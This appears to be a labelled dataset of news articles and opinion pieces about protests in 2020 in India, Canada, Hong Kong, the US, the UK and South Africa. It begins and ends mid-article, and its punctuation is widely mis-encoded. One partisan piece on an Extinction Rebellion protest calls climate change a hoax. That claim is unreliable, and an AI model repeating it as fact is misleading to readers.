G! Festival.â€ Plant, who has not publicly commented on the cancellation, is not the first major act to cancel an appearance at the festival after having the cull brought to their attention. Pop singer Lewis Capaldi and American rapper Princess Nokia have also declined to appear at the festival in wake of the information coming to light. Fatboy Slim donated his booking fee for the event to marine conservation causes after later being informed. You can sign a petition to end the cull here.

Delhi Police forcefully evicted the protesters from Shaheen Bagh after they showed some resistance. Only a few women protesters were still at the Shaheen Bagh site while the others had left and kept only their slippers to show solidarity. FOLLOW CORONAVIRUS LIVE UPDATES Police have detained 6 women and 3 men from Shaheen Bagh for violating Section 144 prohibitory orders.

Security has also been heightened in Jaffrabad where the violent riots broke out in January. Similar anti-CAA protests that were going on at other sites in Delhi have also been cleared, including Hauz Rani, Jamia University, Jaffrabad and Turkman Gate. Some people have been detained in these areas. Paramilitary forces have been deployed in all these areas after Delhi Police started enforcing the lockdown around 7-8 am on Tuesday. As the coronavirus outbreak spread and Delhi went on lockdown, most of the protesting women at Shaheen Bagh had left the protest site. Only a few remained continuing with their demand asking the Centre to repeal the controversial citizenship law. The Delhi government put the national capital on lockdown since 6 am on Monday and all public transport and non-essential services have been suspended till March 31.

1,"About 200 people took over a downtown street on Sunday afternoon to protest against an annual mining industry convention in Toronto. As police officers watched, the protesters rallied on Front Street outside the Metro Toronto Convention Centre, where delegates had gathered for the opening day of the convention of the Prospectors and Developers Association of Canada. The protesters held banners, chanted ""Shame!"" and listened to speakers condemn Canadian mining industry companies for allegedly violating human rights and environmental laws in countries outside Canada in which they operate. ""I think, every day, the ecological crisis gets worse,"" Kirsten Francescone, a member of MiningWatch Canada, told reporters as the rally got underway. ""We definitely cannot think that more destructive mines that violate human rights and destroy people's environments is our way out of that ecological crisis. I am really concerned that the mining industry is using this space to say that we need mining to save us from climate change. We're here to say that shouldn't be the case,"" she added. ""We want other kinds of ways forward for a better future for all of us."" Rachel Small, a member of the Mining Injustice Solidarity Network, said it is important to stand up to what she believes is violence perpetuated by the mining industry. ""We are here in front of the world's biggest mining convention,"" Small said. ""Toronto is here to say no to business as usual with this industry continuing. We know what the Canadian mining industry looks like. We know that their business as usual is literally leading us to an unlivable planet. We cannot allow this to continue,"" she said. ""We are here in solidarity with every community around the world that has faced down the barrel of a gun for daring to say no to a Canadian extractive project."" Small said the protesters came to the rally to disrupt the convention. At one point, the protesters attempted to enter the convention but were stopped by police. They did, however, block different entrances to the building for about an hour. She said the protest was held in part to show solidarity with the Wet'suwet'en chiefs who oppose a natural gas pipeline that would cut through their traditional territory in northern B.C. ""Canada is a country founded on the removal of Indigenous people for extractive projects. That's exactly what's happening right now on Wet'suwet'en land and that's exactly what Canadian mining projects are doing all over the world,"" she added. On Sunday, one chief and senior government ministers said they have reached a proposed agreement over land title but debate continues over the pipeline. The dispute has led to solidarity protests and rail blockades across the country. More than 50 organizations endorsed the rally. Organizers said many of the companies that provide economic support for the Costal GasLink pipeline project in B.C. also take part in the mining convention. Sponsors of the four-day conference include such mining companies as Vale, Hudbay, Barrick Gold, Teck and BHP. The association has 7,500 members. In recent years, the convention has attracted more than 25,000 people from 131 countries.   With files from Natalie Nanowski, The Canadian Press Audience Relations, CBC P.O.

1,"The Allahabad High Court ordered the hoardings to be removed. The Yogi Adityanath government's ""name and shame"" campaign came to an abrupt halt today as the Allahabad High Court ordered that all posters and hoardings naming those accused of violence during protests against the controversial citizenship law be immediately removed. Citing the Right to Privacy as a fundamental human right recognised by the United Nations as well as the Supreme Court, the judges said the government's move to display photographs and personal details of the accused on roadside hoardings was ""an unwarranted interference in privacy"". The Lucknow administration has to give a compliance report on the removal to the registrar general by March 16, the court said. Sources said the hoardings â€“ in which the persons named were asked to pay for damage to public property and warned that their property would be attached otherwise -- were put up on instructions of Chief Minister Yogi Adityanath. The High Court had taken up issue on its own, asking the government to explain its position during a rare hearing on a Sunday, a court holiday. Senior advocate KK Rai, who attended the initial hearing at 10 am, said Chief Justice Govind Mathur had made some strong remarks on the issue, saying the government was ""impinging on privacy, respect and freedom"" and called it an ""illegal move"". Today, responding to the government's contention that the court ""erred in invoking public interest jurisdiction"", the judges said, ""Courts are meant to impart justice and no court can shut its eyes if a public unjust is happening just before it"". The judges said they were not concerned with ""validity of the compensation fastened, but to the act about disclosure of personal details of the accused persons"". ""In the present case, the cause is not about personal injury caused to the persons whose personal details are given in the banner but the injury caused to the precious constitutional value and its shameless depiction by the administration. The cause as such is undemocratic functioning of government agencies which are supposed to treat all members of public with respect and courtesy and at all time should behave in manner that upholds constitutional and democratic values,"" the judgment read.  Activist-politician Sadaf Jafar, who was one of the people named in the hoardings, welcomed the judgment. Calling the government's move an effort to compromise the rule of law, she said the move of the court sets an example and ""reinforces our faith in the country's constitution"". ""The damage is already done. This is a digital age. But this is a moral victory for us,"" said Deepak Kabir, theater artist and another accused in the matter.

1,"Eilish's next show is in Orlando, FL on March 10. Billie Eilish kicked off the first leg of her WHERE DO WE GO? World Tour on March 9 in Miami, FL. In addition to rocking the house with a lengthy 22-song set, the 18-year old singer also made a powerful statement regarding body positivity. Billie Eilish dominated 2019. In addition to dropping her debut length record WHEN WE ALL FALL ASLEEP, WHERE DO WE GO? she also became the first woman to ever sweep the four main categories at the Grammys. Eilish has always been outspoken about body positivity and anti-body shaming. Since breaking through, Eilish has rocked her trademark baggy clothes-style. Speaking in a Calvin Kleins ad last May, Eilish explained her reasoning for the fashion choice. â€œI never want the world to know everything about me. I mean, thatâ€™s why I wear big, baggy clothes. Nobody can have an opinion because they havenâ€™t seen whatâ€™s underneath. Nobody can be like, â€˜sheâ€™s slim-thick,â€™ â€˜sheâ€™s not slim-thick,â€™ â€˜sheâ€™s got a flat ass,â€™ â€˜sheâ€™s got a fat ass.â€™ No one can say any of that because they donâ€™t know.â€ Now, Eilish is continuing her sentiments in a powerful, new video interlude she debuted at the start of this tour. The video occurred just before Eilish kicked into â€œall the good girls go to hell.â€ In it, we see Eilish dressing down until sheâ€™s in her bra while a voice-over delivers a â€˜must-hearâ€™ message. â€œDo you really know me? You have opinions about my opinions, about my music, about my clothes, about my body,â€ Eilish begins. â€œSome people hate what I wear, some people praise it. Some people use it to shame others, some people use it to shame me. But I feel you watchingâ€¦ always. And nothing I do goes unseen. So while I feel your stares, your disapproval or your sighs of relief, if I lived by them, Iâ€™d never be able to move.â€ â€œWould you like me to be smaller? Weaker? Softer? Taller? Would you like me to be quiet? Do my shoulders provoke you? Does my chest? Am I my stomach? My hips? The body I was born with, is it not what you wanted? If what I wear is comfortable, I am not a woman. If I shed the layers, I am a slut.â€ â€œThough youâ€™ve never seen my body, you still judge it and judge me for it. Why? You make assumptions about people based on their size. We decide who they are. We decide what theyâ€™re worth. If I wear more, if I wear less, who decides what that makes me? What that means? Is my value based only on your perception? Or is your opinion of me not my responsibility?â€ Watch the fan-shot video below. ï»¿ As stated, Eilish performed a staggering 22-song set that included her recent James Bond theme â€œNo Time To Die,â€ in addition to the hits from her body of work.

1,"Last week, an indelible protest by the U.S. womenâ€™s national team against the U.S. Soccer Federation turned into a viral business opportunityâ€”and showed exactly how rabid the fan base for the USWNT really is. BreakingT is a company that makes moment-driven sports apparel, the kind that can jump on fan interest in real time to sell T-shirts and sweatshirts immediately after games. The company got the license for the USWNT Players Association ahead of World Cup 2019, and it had success selling shirts during the tournament like Rapinoe-Bird 2020, a nod to Megan Rapinoe and her partner, WNBA star Sue Bird. (BreakingT also has the license for the WNBA players union.) But what happened last week during the SheBelieves Cup put those World Cup sales figures to shame. It started with Christen Pressâ€™s bending golazo against England. BreakingT immediately put out a shirt bearing the likeness of Press and the call from ESPN broadcast Sebastian Salazar: â€œCHRISTEN PRESS, WHAT HAVE YOU DONE?â€ â€œThat sold really, really well,â€ said BreakingTâ€™s director of marketing, Dom Bonvissuto. â€œAnd it just continued to shine a light on the fact that womenâ€™s soccer and its fans are super-passionate and exactly the right fan base to hit with this model. Then on Wednesday night we saw that the women walked out with their warmups inside out. And we were obviously struck immediately by the empty shield with the four stars. Thatâ€™s a shirty thing. We need to get going.â€ The USWNTâ€™s protest was elegant in its simplicity. Two days earlier, new filings in the USWNT playersâ€™ gender-discrimination suit against U.S. Soccer had been released in which the federation argued that womenâ€™s players inherently had less skill, ability and responsibility than menâ€™s players, which is why women were paid less than men. The legal strategy might have been useful in a court of law, but it was offensive and objectionable on a massive scale. Several U.S. Soccer sponsorsâ€”Coca-Cola, Budweiser, Deloitte, Volkswagenâ€”issued strongly worded statements excoriating the federation. Meanwhile, the USWNT spoke with action. On game day, the players came up with a plan. Wearing their pregame warmups inside out made invisible the U.S. Soccer badge and left only the badgeâ€™s outline and the four stars above it, representing the teamâ€™s four World Cup victories. It was the perfect symbolism, a way to show the abject emptiness of the U.S. Soccer Federation while still honoring the players who have led the U.S. to its greatest soccer triumphs. The U.S. players only reinforced that point by having every single player on the team pose unsmiling in those shirts for the pregame photo that usually just includes the starting 11 players. BreakingT had a design for a T-shirt ready before the game even started and got it approved by Becca Roux, the executive director of the USWNTPA. Bonvissuto (full disclosure: He used to work as an SI.com editor) hit send on the first tweet announcing the sale of the â€œ4 Stars Onlyâ€ T-shirt (price: $28) at 10:17 p.m. ET on Wednesday, within minutes of the final whistle. â€œAnd it hit like crazy,â€ he said. Goosed along by tweets from Alex Morgan, Ashlyn Harris and Allie Long, the sales were remarkable. Even though the shirts were available for only one hour and 43 minutes on Wednesday, that day was the best-selling day for direct-to-consumer sales in BreakingTâ€™s history. On Thursday came another record. â€œ4 Stars Onlyâ€ sold far more online than anything the company has ever produced, including all of the World Cup 2019 shirts and shirts commemorating the titles of the Washington Nationals and Kansas City Chiefs. When it came to â€œ4 Stars Only,â€ Bonvissuto said, â€œWe sold more than 5,000 units in the first 24 hours.â€ The USWNT players receive a portion of the proceeds, of course, but even on Wednesday night they anticipated what they might want to do with those. â€œWe've already had conversations about where some of the proceeds from this could go, especially with the women's national team games being canceled in April,â€ Roux said. â€œIs there a way for us to funnel money to those independent-contractor employees who would have otherwise received work for those two games? That was something the players brought up on Wednesday night before we knew how successful it would be after the game.â€ One of the challenges of having a T-shirt company that has to work fast off breaking news is getting the various clearances to do so, including from the legal side of things. BreakingT did another shirt on Julie Ertzâ€™s late game-winning goal against Spain (ERTZ SO GOOD). When it was pointed out on Twitter that the drawing of Ertz looked just like a shot taken by photographer Ashley Intile, the company ended up doing a royalty agreement with Intile. The success of the USWNT playersâ€™ own licensing ventures also shows that their ability to generate revenue goes far beyond what the federation has said and done with the team in the past. As Roux put it, â€œThe players thought there was more in the market that wasnâ€™t being monetized. There was value being left on the table, while at the same time the federation was using an argument of revenue generation against them.â€ â€œ4 Stars Onlyâ€ is just the latest evidence.

1,"By Pak Yiu HONG KONG (Reuters) - University student 'A', says she used to be a 'typical girl' who liked to shop, drink bubble tea and watch Korean soap operas but all that changed as Hong Kong's anti-government protests gained momentum and she stepped up to take a place in the frontlines. She is now charged with rioting, an offence which carries a maximum ten year jail sentence, and is on bail awaiting trial. The protests began last June and at first, the frontlines were predominantly men. That started to gradually change and women began building roadblocks, throwing back tear gas cannisters as well as facing rubber bullets and bean-bag rounds. The 22-year-old, who did not want to be identified for fear it could affect her trial, said her shift to the frontline came in stages. ""I was at the back, I would just go home after I marched. I started to think I could go further and further forward, till I was at the very front."" At the frontlines, it can be hard to tell the difference between men and women among the black-clad protesters but 'A' says she felt a sense of female empowerment and gender equality when she came across other women - even if men sometimes tell women to retreat. In the past nine months, 7,165 people have been arrested, according to the city's Security Bureau. The protests have quietened down due to spread of the coronavirus, but there are signs the movement could again mobilise with at least three protests scheduled for Sunday. Although Hong Kong's controversial extradition bill, which sparked the protests, has been withdrawn, protesters have been marching for an investigation into police brutality and the downgrading of riot charges for those who have been arrested. The student says she believes more women could play a greater role in progressing the campaign for more democratic measures to be put in place across the city. ""Women should also come out for this. Men shouldn't be responsible for everything, women should also take some responsibility,"" she said. ""We're no longer weak, or the ones with 'princess syndrome'. So I think now, we are evolving like Pokemon, we're on another level. We're different.""

Canadian Pacific Railway on Tuesday upped its offer by $2 billion to $27.3 billion in cash and stock in a showdown with larger rival Canadian National Railway. That drove shares of Kansas City up 7% in early trading. Canadian Pacific shares fell, while Canadian Nationalâ€™s rose. It all started in March, when Canadian Pacific reached a $25 billion deal to acquire Kansas City in the hopes of creating the first railroad linking Canada, the U.S., and Mexico. One month later, Canadian National swooped in with a higher bid. It and Kansas City then agreed on a nearly $30 billion deal thatâ€™s set for a shareholder vote on August 19. Canadian Pacificâ€™s move marks a U-turn, since the second-biggest Canadian railroad operator had vowed in April not to raise its bid. Still, its latest offer is lower than that of Canadian National. Canadian Pacific has said its rivalâ€™s offer would reduce competition and negatively impact shippers. Kansas City and Canadian National were not immediately available for comment.

1,"Staten Island Amazon workers walk out STATEN ISLAND, N.Y. -- The worker who helped organize a walkout at Staten Islandâ€™s Amazon fulfillment center on Monday said later in the day that he was fired by the company. Workers at the Bloomfield-based fulfillment center walked out during their lunch break to protest working conditions during the coronavirus (COVID-19) outbreak. With city police officers making sure protestors maintained a six-foot distance from each other, at least 50 people took part in the rally in front of the facility, known as JFK8 -- which has 5,000 workers. The facility is Staten Islandâ€™s largest employer. The rallyâ€™s organizer, Chris Smalls, an employee at the facility, said he was fired today. â€œAmazon would rather fire workers than face up to its total failure to do what it should to keep us, our families, and our communities safe,"" said Smalls. ""I am outraged and disappointed, but Iâ€™m not shocked. As usual, Amazon would rather sweep a problem under the rug than act to keep workers and working communities safe. Today, I stood with my co-workers because conditions at JFK8 are legitimately dangerous for workers and the public. Amazon thinks this might shut me up, but Iâ€™m going to keep speaking up. My colleagues in New York and all around the country are going to keep speaking up. We wonâ€™t stop until Amazon provides real protections for our health and safety and clarity for everybody about what it is doing to keep people safe in the middle of the worst pandemic of our lifetimes,â€ he added. However, Amazon said in a statement to the Advance/SILive.com that Smalls was released of his duties because he violated social distancing guidelines. â€œMr. Smalls received multiple warnings for violating social distancing guidelines and putting the safety of others at risk. He was also found to have had close contact with a diagnosed associate with a confirmed case of COVID-19 and was asked to remain home with pay for 14 days, which is a measure weâ€™re taking at sites around the world,"" said Amazon in a statement. â€œDespite that instruction to stay home with pay, he came onsite today, March 30, further putting the teams at risk. This is unacceptable and we have terminated his employment as a result of these multiple safety issues,â€ she added. In response to the termination, Stuart Appelbaum, president of the Retail, Wholesale and Department Store Union (RWDSU), said: â€œWorkers should be protected when speaking out about safety conditions during this crisis. They are performing a public service. It is unacceptable that Amazon has terminated Chris Smalls for doing that today rather than addressing their serious COVID-19 safety problems.â€ While Amazon workers on Staten Island are not unionized, they have sought to form a union in the past. Some of the groups that sponsored the protest on Monday also issued a joint statement about Smalls being fired. â€œAmazon will give a lot of reasons for why Chris Smalls was fired today. But the facts stand: at midday today, Chris stood up and called out Amazon for failing to protect our safety and our health. Hours later, he was fired,"" said a joint statement from Athena Coalition director Dania Rajendra, Make the Road NY co-executive director Deborah Axt and New York Communities for Change director Jonathan Westin. â€œChris, along with many of his colleagues in New York and around the country, have dared to tell the truth about the dangerous conditions at Amazon facilities. We can only conclude that instead of listening to the people who are actually risking their lives on the frontlines, Amazon would rather they just shut up about Amazon working conditions, which are now a national public health concern,â€ said the joint statement. MONDAYâ€™S WALK OUT Amazon workers said they were protesting on Monday because the facility, known as JFK8, was not closed for deep cleaning after sources said that multiple workers had contracted the coronavirus. While it appeared there were at least 50 protesters at the walk out, Amazon said only about 15 of them were employed at the facility. A spokesperson for the Amazon facility wouldnâ€™t confirm the number of coronavirus cases and told the Advance on Saturday that the facility would not be closed for deep cleaning. Amazon said the confirmed cases at JFK8 are not linked to one another. And the workers who contracted the virus had no contact with each other, the company said. â€œWorkers are really scared right now. As of this morning, it looks like there is another case in the warehouse. This brings it up to six or seven cases,â€ said Zack Lerner, the organizing director of New York Communities for Change, which helped stage the walkout with Made The Road New York. Both are grassroots organizations. Lerner claimed management didnâ€™t make employees aware of the confirmed cases. *** CLICK HERE FOR COMPLETE COVERAGE OF CORONAVIRUS IN NEW YORK *** RELATED COVERAGE Amazon workers protest working conditions amid coronavirus outbreak Amazon workers plan walkout at Staten Island facility Monday due to coronavirus S.I.

1,"A pair of Utah men are behind bars after police found numerous weapons and social media posts threatening violence against officers. Authorities in West Valley, Utah say 27-year olds Yuri Silva and Christian Hernandez were pulled over on their way to a protest in Salt Lake City, and cops found several firearms in their vehicle, including what the Deseret News describes as an Uzi with a suppressor. In the home of Yuri Neves Silva, 27, of West Valley City, more weapons were found and seized. Information about a potential motive was not immediately available, but police believe the two were headed to the protests to cause trouble. â€œWe had every reason to believe thatâ€™s what they intended to do,â€ Vainuku said. Silva had posted â€œmultiple threats of violence against police, specifically Salt Lake City police and West Valley City policeâ€ over social media and â€œencouraged others to take up arms against police as well, and had reportedly listed the names and addresses of specific officers to be targeted,â€ she said. Silva was arrested for investigation of making a terroristic threat. Police say Silva was making multiple posts about harming police officers and was seen in one picture holding a gun, according to a police affidavit. Silvaâ€™s not a prohibited person, but the same canâ€™t be said for his buddy. Christian Hernandez is now facing felon in possession and drug charges after marijuana was found in the vehicle along with the firearms. As for Silvaâ€™s alleged threats, they seem to be pretty specific in their intent. â€œIn one video posted on (Sunday), the suspect made a video showing himself mocking the Salt Lake City curfew, stating, â€˜Hands up donâ€™t shoot,â€™â€ while also threatening to kill police officers, the affidavit states. â€œThe suspect also made comments knowing officers were trying to follow his Facebook page and he directed officers to stay at home to protect their families, otherwise â€˜we will have no choice but to affiliate you with your â€¦ colleagues and their actions.â€™ â€œThe suspect also mentions a police officer who resides in his neighborhood and comments, â€˜You put that cop car in the garage real quick play boi,â€™â€ according to the affidavit. According to police, Silva denies that he had any actual intent to harm police officers, but admitted that he hoped his social media posts would incite others to violence. That excuse may have been more believable if Silva and Hernandez hadnâ€™t had multiple firearms with them on their way to what was supposed to be a peaceful protest. Thankfully, things seem to be calming down in Salt Lake City after a weekend of violence. Protests on Tuesday were loud but lawful for the most part. One person was arrested at the state capitol after protests continued long past the curfew imposed by the mayor, but that was it. If Silva and Hernandez hadnâ€™t been apprehended, however, who knows how bad things would have gotten. The legitimate protesters may have issues with police, but they should be praising officers for their actions in thwarting what very well could have turned a peaceful protest into a bloodbath.

1,"Extinction Rebellion has done it again. It seems thereâ€™s no deed to embarrassing or asinine for this particular brand of climate hysteric to commit in their deluded plot to save humanity from global warming. While you might know them for gluing themselves to planes, trains, buildings, roads, and the gates of Downing Street, 31 female members of the group opted for a protest befitting the International Womenâ€™s Day on which it occurred: a topless human chain. Because what could possibly spread awareness and call world leaders to action better than a bunch of women standing around half-naked in the middle of a winter day in London? According to the Metro, the women stood on Waterloo Bridge with â€œclimate rapeâ€ and â€œclimate murderâ€ and other slogans painted on their bare chests. Sarah Mintram, a former teacher and participant in the protest explained that the rationale behind the topless protest is the dubious fact that women are suffering more than men due to violence caused by climate change. Yeah. Really. â€œItâ€™s mainly women in poorer countries in the global south that are experiencing the increase in violence but this will be the reality for all women if the climate and ecological crisis continues to go unaddressed,â€ Mintram said. â€œWe are here to raise the alarm about what is happening to our sisters around the world and to tell women in the UK the climate and ecological emergency is your issue,â€ she continued, â€œIt will affect you as a woman if we do not persuade our government to take urgent action starting now.â€ â€œAs part of a series of actions around the world, XR UK women formed a topless chain across Waterloo Bridge to highlight the vulnerability of women in the face of climate breakdown,â€ the group said in a tweet sharing the photos.  â€œThe climate emergency is a womenâ€™s emergency,â€ the group continued. â€œWe are here to highlight the increase in hardship, violence & rape already facing women in the global south as a result of the climate & ecological emergency.â€  â€œWhy is climate a womenâ€™s issue? A January 2020 report by the International Union for the Conservation of Nature found that climate breakdown and environmental degradation are driving an increase in violence against women,â€ Extinction Rebellion said in a tweet explaining the protest. They cited a January 2020 report from the International Union for the Conservation of Nature, which claimed that climate change was responsible for violence against women in the Southern Hemisphere. â€œThe report found that deforestation and the degradation of land mean women have to travel further to collect the things they need, like firewood, and are exposed to violence, rape and abduction when they make these journeys,â€ the group continued. According to Breitbart, Extinction Rebellion has been plaguing Londonâ€™s Metropolitan Police Service (MPS) for years. Their antics cost the capitolâ€™s police forceâ€”and therefore taxpayersâ€”an estimated Â£37 million last year alone, more than double the Â£15 million annual budget for the Violent Crime Taskforce. I cannot wait for the next few decades to go by only for these folks to realize that theyâ€™ve fallen for a complete and utter hoax.

Protestors in Ladysmith KZN. Government vehicles set on fire. pic.twitter.com/fy69KbkHrJ Protests have been ongoing in Ladysmith since February, with incensed residents calling for the head of fraud and corruption accused Alfred Duma local municipality mayor Vincent Madlala, as well as bemoaning poor service delivery, water shortages and escalating violence between warring taxi associations. The Department of Social Development vehicles were torched on Wednesday evening, and although there is currently no leads on who the culprits are, eNCA report that evidence points to a petrol bomb attack. Roads going in and out of town have been barricaded with the carcasses of burnt-out trucks and minibus taxis that continue to enforce a total shutdown in the area. KZN Premier Sihle Zikalala decried the loss of nearly R2 million a day with businesses, factories and transport operators rendered utterly unable to function amid the chaos. KZN MEC Nonhlanhla Khoza has called for the perpetrators of the attack on the government vehicles to be swiftly brought to justice. â€œThe department has received a report and seen pictures with its six vehicles burnt by brazen criminals,â€ said Khoza. â€œWe are shocked at this despicable act of vandalism, which is totally abhorrent, destructive and beyond any justification whatsoever.â€ â€œThese vehicles are an important tool used to quickly respond and provide services to our needy communities,â€ she said. She said that the crime was just another in a long line of threatening acts committed against government employees in the area. â€œThe torching of our vehicles is another form of threatening employees who have suffered a lot of hijackings in the past.â€ â€œThe law must take its course wherever and whenever our properties are under threat. We urge police to investigate such criminal activities without fear or favour. No-one should do these despicable and morally reprehensible acts, despite any frustration,â€ she said.

1,"Police granted custody of Shifa Ur Rahman, Jamia Alumni president The protests against the Citizenship Amendment Act held at Jamia Millia Islamia University and other parts of Delhi were funded from the Middle East, the Delhi Police told a local court on Monday. The Patiala House Courts later sent Shifa Ur Rahman, Jamia alumni president who was arrested on Sunday, to 10-day police custody. â€œFrom the interrogation of witnesses, it is revealed that accused Shifa Ur Rehman received funds from members of alumni association of Jamia Millia Islamia based in Middle East countries and he was co-coordinating at the protest sites,"" the Delhi police said in its application demanding custody of Rahman. Police said Rahman's name had popped up during the questioning of Ishrat Jahan, Khalid Saifi, Meeran Haider, Safora Zargar, Gulfisa, Tahir Hussain, and three members of the Popular Front of India (PFI). ""Shifa-Ul-Rehman is also found actively involved in a conspiracy hatched in setting up anti CAA/NPR/NRC protests at various sites in Delhi, giving hate speeches that led to the riots in February 2020 at various protest sites, i.e., Jamia Nagar, Shaheen Bagh, Seelampur, Khureji, Inderlok and Hauz Rani,"" it said. According to police, Rehman along with AAJMI members namely Areeb and Badre Alam and other members of Jamia Co-ordination Committee (JCC), had visited various protest sites in Delhi. The Delhi police told the court that during the investigation, names of some more suspects have come out and the accused should be questioned at length about those suspects to obtain their exact particulars. â€œHuge money was also funded as well as spent by the conspirators to carry out these riots in Delhi,"" the police said, adding that the custodial interrogation of Rahman is required to confront him with huge technical data and other evidence collected during investigation. At least 53 people died in Delhi in February as those opposing and favouring the new citizenship law clashed each other, leaving a trail of destruction in several areas of the national capital. The Special Cell of the Delhi Police is probing the larger conspiracy behind the riots. Copyright Â© 2021 All rights reserved"

Health-care workers are the only people standing between everyday citizens and the novel coronavirus â€” even if those everyday citizens value their own personal freedom over things like public health, common sense or their own lives. That dynamic was on full display in Denver, Colo., over the weekend, where the United States got its own bizarre Tiananmen Square-like photo moment â€” except instead of a protester standing up to a government tank, it was two health-care workers standing up to a â€œLand of the freeâ€-loving couple in a truck. Video and photos circulating online show two people in scrubs and masks blocking a crosswalk to stop a procession of far-right protesters en route to the stateâ€™s Capitol, where many of their ilk were already violating physical distancing rules to call for an end to the coronavirus lockdowns meant to slow the spread of the virus. Remarkable scene at 12th and Grant, where two healthcare workers from a Denver-area hospital â€” they declined to say which or give their names â€” are standing in the crosswalk during red lights as a â€œreminder,â€ they say, of why shutdown measures are in place. pic.twitter.com/7xTjXvGN2E â€” Chase Woodruff (@dcwoodruff) April 19, 2020  The two counter-protesters â€” a man and a woman â€” could be seen standing in the path of a large silver pickup truck on Sunday, refusing to budge while the vehicleâ€™s occupants hurled a flurry of verbal abuse at them. A witness described them as â€œnursesâ€ in his video, although their exact professions are unknown. They told another witness they were health-care workers. READ MORE: Store boss flips off coronavirus hoarder asking for $10K toilet paper refund â€œGo to China!â€ a middle-aged blonde woman in a U.S.A. shirt shouted at them from the pickup truck, while leaning out of the passengerâ€™s window. â€œItâ€™s a free country! America the free!â€ she declared, before slapping a sign reading â€œLand of the freeâ€ onto the windshield. The two health-care workers did not move. Videos and photos of the incident have circulated widely on the internet, where many have called it a perfect encapsulation of the anxiety and frustration emerging around the COVID-19 pandemic. The illness has killed more than 40,000 people in the United States alone, while lockdowns meant to slow its spread have tipped the world into a major recession. Many have become impatient with the lockdowns, although grouping up to protest those lockdowns appears to be a largely right-wing phenomenon at this point. READ MORE: COVIDIOTS â€” New name for shaming ignorant, selfish coronavirus reactions More than 12 million people have watched the Denver video on Twitter alone, where the angry woman has been dubbed â€œKarenâ€ â€” an internet slang term for an irritating woman who demands to speak to the manager when she doesnâ€™t get her way. â€œThe most un-American thing you can do is tell medical professionals whoâ€™re saving American lives to go to China,â€ Twitter user Michelle Sylvester wrote. â€œBye Karen.â€ I cannot wait for this to become an iconic photo.

Trump appeared to turn the lockdown into another front in the U.S. culture war on Friday when he encouraged Americans to â€œLIBERATEâ€ Michigan, Minnesota and Virginia â€” three states with Democratic governors running their lockdowns. READ MORE: Trump vs. himself â€” How he dismissed the coronavirus, in his own words Pro-Trump signs have been a common sight at these protests, including the one in Denver. â€œThese people love our country,â€ Trump said at his daily press briefing in Washington on Sunday, when asked about the right-wing protests. â€œThey want to get back to work.â€ â€” Questions about COVID-19? Here are some things you need to know: Health officials caution against all international travel. Returning travellers are legally obligated to self-isolate for 14 days, beginning March 26, in case they develop symptoms and to prevent spreading the virus to others. Some provinces and territories have also implemented additional recommendations or enforcement measures to ensure those returning to the area self-isolate. Symptoms can include fever, cough and difficulty breathing â€” very similar to a cold or flu. Some people can develop a more severe illness. People most at risk of this include older adults and people with severe chronic medical conditions like heart, lung or kidney disease. If you develop symptoms, contact public health authorities. To prevent the virus from spreading, experts recommend frequent handwashing and coughing into your sleeve. They also recommend minimizing contact with others, staying home as much as possible and maintaining a distance of two metres from other people if you go out.

1,"As social distancing and lockdown measures are extended in many countries, people are starting to get frustrated. In some instances â€“ instead of staying inside, or writing to their representatives â€“ people are starting to defy lockdown and hold physical protests. Fox News hosts are among those encouraging people to carry out physical protests against stay-at-home orders, potentially endangering the lives of countless others. In Michigan, a mass protest was organised in defiance of the governorâ€™s stay-at-home orders. Recent figures put the number of deaths in Michigan at 1,900. Laura Ingraham, a prominent host on FOX news, tweeted in approval and suggested that the same may start to happen in other states. Initially, protesters were supposed to create traffic gridlock and hold signs from their cars, but a group gathered on the steps of Michiganâ€™s city hall. They said that the damage caused by the economic impact of stay-at-home orders was greater than the damage caused by Covid-19. Other Fox News hosts, such as Jeanine Pirro, expressed similar sentiments on TV, saying that health officials had ""overblown sentiments"" and that the American spirit would not â€˜take itâ€™. She also said that what had happened in Lansing, Michigan, would start to happen all over the country. On the Fox news website, coverage of protests featured prominently. Ingraham, Pirro and a number of other Fox News hosts were calling for stricter lockdown measures and more guidance from central government towards the end of March, although they appear to have changed their mind after a few weeks. Thereâ€™s little evidence to suggest that any states in the US have reached a peak in Covid-19 cases. Other prominent personalities in right-wing media have expressed frustration at public health measures â€“ pro-Trump commentator Candace Owens tweeted in anger after being asked to wear a mask in a supermarket (she also said that she had been going every day). Similar protests have taken place in Vancouver, Canada, where a small group of people gathered to protest what they saw as government overreach, and were promptly fined or arrested.

1," Overwhelmed healthcare workers across the country are taking to the streets to demand safer working conditions and more personal protection equipment to help them fight the coronavirus pandemic. Nurses and doctors on the frontlines are asking federal and state governments as well as hospitals to do more to protect staff and want more PPE to ensure their safety while on the job. With widespread shortages of the vital N95 respirator masks, face shields, gloves and fluid-resistant gowns, federal and state governments are partnering with the private sector to produce and distribute more PPE to frontline workers.

1,"The majority of Michigan residents approve of Governor Gretchen Whitmer's handling of the coronavirus pandemic, despite last week's large protest against the state's stringent stay-at-home order, polling has shown. The new survey, published Monday and conducted by the Detroit Regional Chamber, found that 57 percent of respondents approved of Whitmer's coronavirus response in Michigan, while just 37 percent disapproved. Meanwhile, only 44 percent of those polled approved of President Donald Trump's response to the crisis, while 50 percent disapproved. Among those surveyed, 39 percent self-identified as Democrats, while 35 percent identified as Republicans and 26 percent said they were independents. In total, 600 Michigan residents were polled. Last Wednesday, thousands of protesters descended on Lansing to demonstrate against the social-distancing requirements put in place by Michigan's Democratic governor. While organizers encouraged demonstrators to remain in their cars as they drove through the city holding signs and waving flags, some protesters exited their vehicles and disregarded social distancing measures. Demonstrators held signs that read: ""Security Without Liberty Is Called Prison,"" ""Liberty Once Lost Is Lost Forever"" and ""Recall Whitmer,"" USA Today reported. Trump later voiced his support for the anti-social-distancing protests in Michigan as well as in other states around the country. ""Liberate Michigan!"" the president tweeted on Friday. ""A small segment of the state is protesting, and that's their right,"" Whitmer told CNN on Wednesday. ""The sad part is, though, that the more that they're out and about, the more likely they are to spread COVID-19 and the more likely we're going to have to take this posture for a longer period of time,"" she warned. As of early Monday afternoon, Michigan had more than 30,000 confirmed cases of the coronavirus. Of those, 2,374 people have died. Tori Meyer, a resident of Berrien County in southwest Michigan, told Newsweek that she supported Whitmer's stay-at-home order and believed the governor was taking appropriate steps to protect the people of her state. ""Hands down, I trust Whitmer more than Trump,"" Meyer, 30, said. ""Instead of leading us, he's gone back and forth with his stance on the coronavirus, refuses to fully address the issues and instead let the states fight it out with each other, so to speak."" Meyer said she wasn't surprised that people had protested the lockdown but felt embarrassed by the demonstrations. ""It's embarrassing for others to see that and think maybe all Michiganders are that way,"" Meyer said. ""No one wants to be stuck at 